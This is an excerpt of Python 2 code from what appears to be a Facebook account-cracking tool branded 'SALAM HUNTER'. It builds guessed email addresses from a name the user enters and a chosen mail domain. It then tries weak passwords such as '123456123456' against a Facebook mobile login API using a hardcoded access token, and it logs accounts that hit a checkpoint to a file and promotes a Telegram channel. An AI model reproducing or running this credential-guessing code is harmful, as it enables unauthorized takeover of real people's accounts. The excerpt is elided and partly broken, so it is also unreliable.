...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://t.me/T5B55')
    else:
...
def login():
	...
	print logo
        ...
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m2.\x1b[1;94m Telegram  Channel   "
...
def action():
	...
	if lovehackerx =='':
		...
		print (logo1)
		try:
		    print(B + "[Type Any Name Small Words first name and last name]")
		    print("      [Example]  aliraza")
		    print("      [Example]  sanakhan")
		    print("===============SALAM HUNTER=============")
		    nam = raw_input("[+] Type Any Name ==> : ")
		    print(Y + "================SALAM HUNTER===================")
		    print("[Choose Any @mail Domain]")
		    print("     @hotmail.com")
		    print("     @outlook.com")
		    print("     @icloud.com")
		    print("     @list.ru")
					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 				            ...
 				            pass3="123456123456"
 				            data = br.open("ttps://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 				            q = json.load(data)
 				            if 'access_token' in q:
                                ...
                                if 'access_token' in q:
                                    ...
                                    if 'www.facebook.com' in q['error_msg']:
                                        print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass5+'\n'
                                        cps = open('save/checkpoint.txt', 'a')
